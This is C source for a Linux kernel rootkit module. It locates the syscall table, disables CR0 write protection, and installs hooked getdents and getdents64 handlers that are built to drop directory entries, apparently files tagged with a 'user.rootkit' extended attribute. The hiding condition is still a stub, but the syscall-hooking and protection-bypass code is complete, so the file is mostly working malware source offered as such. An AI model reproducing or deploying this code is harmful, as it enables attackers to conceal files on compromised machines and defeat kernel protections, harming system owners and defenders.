#include <linux/kallsyms.h>
#include <linux/slab.h>

#include "hook.h"

void **sys_calls;

asmlinkage long (*sys_getdents)(const struct pt_regs *);
asmlinkage long (*sys_getdents64)(const struct pt_regs *);

struct linux_dirent {
        unsigned long   d_ino;
        unsigned long   d_off;
        unsigned short  d_reclen;
        char            d_name[1];
};

int
retrieve_sys_call_table(void)
{
    return NULL == (sys_calls
        = (void **)kallsyms_lookup_name("sys_call_table"));
}

void
init_hooks(void)
{
    sys_getdents = (void *)sys_calls[__NR_getdents];
    sys_getdents64 = (void *)sys_calls[__NR_getdents64];
}

void
disable_protection(void)
{
    write_cr0(read_cr0() & (~0x10000));
}

void
enable_protection(void)
{
    write_cr0(read_cr0() | 0x10000);
}


// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/entry/syscall_64.c
// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/ptrace.h#L12
asmlinkage long
g7_getdents(const struct pt_regs *pt_regs)
{
    typedef struct linux_dirent *dirent_t_ptr;

    unsigned long offset;
    dirent_t_ptr kdirent, cur_kdirent, prev_kdirent;

    cur_kdirent = prev_kdirent = NULL;
    dirent_t_ptr dirent = (dirent_t_ptr)pt_regs->si;
    long ret = sys_getdents(pt_regs);

    if (ret <= 0 || !(kdirent = (dirent_t_ptr)kzalloc(ret, GFP_KERNEL)))
        return ret;

    if (copy_from_user(kdirent, dirent, ret))
        goto yield;

    for (offset = 0; offset < ret;) {
        cur_kdirent = (dirent_t_ptr)((char *)kdirent + offset);

        if (false) { // TODO: detect xattrs user.rootkit = rootkit
            if (cur_kdirent == kdirent) {
                ret -= cur_kdirent->d_reclen;
                memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
                continue;
            }

            prev_kdirent->d_reclen += cur_kdirent->d_reclen;
        } else
            prev_kdirent = cur_kdirent;

        offset += cur_kdirent->d_reclen;
    }

    copy_to_user(dirent, kdirent, ret);

yield:
    kfree(kdirent);
    return ret;
}

// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/entry/syscall_64.c
// https://elixir.bootlin.com/linux/v4.19/source/arch/x86/include/asm/ptrace.h#L12
asmlinkage long
g7_getdents64(const struct pt_regs *pt_regs)
{
    typedef struct linux_dirent64 *dirent64_t_ptr;

    unsigned long offset;
    dirent64_t_ptr kdirent, cur_kdirent, prev_kdirent;

    cur_kdirent = prev_kdirent = NULL;
    dirent64_t_ptr dirent = (dirent64_t_ptr)pt_regs->si;
    long ret = sys_getdents64(pt_regs);

    if (ret <= 0 || !(kdirent = (dirent64_t_ptr)kzalloc(ret, GFP_KERNEL)))
        return ret;

    if (copy_from_user(kdirent, dirent, ret))
        goto yield;

    for (offset = 0; offset < ret;) {
        cur_kdirent = (dirent64_t_ptr)((char *)kdirent + offset);

        if (false) { // TODO: detect xattrs user.rootkit = rootkit
            if (cur_kdirent == kdirent) {
                ret -= cur_kdirent->d_reclen;
                memmove(cur_kdirent, (char *)cur_kdirent + cur_kdirent->d_reclen, ret);
                continue;
            }

            prev_kdirent->d_reclen += cur_kdirent->d_reclen;
        } else
            prev_kdirent = cur_kdirent;

        offset += cur_kdirent->d_reclen;
    }

    copy_to_user(dirent, kdirent, ret);

yield:
    kfree(kdirent);
    return ret;
}
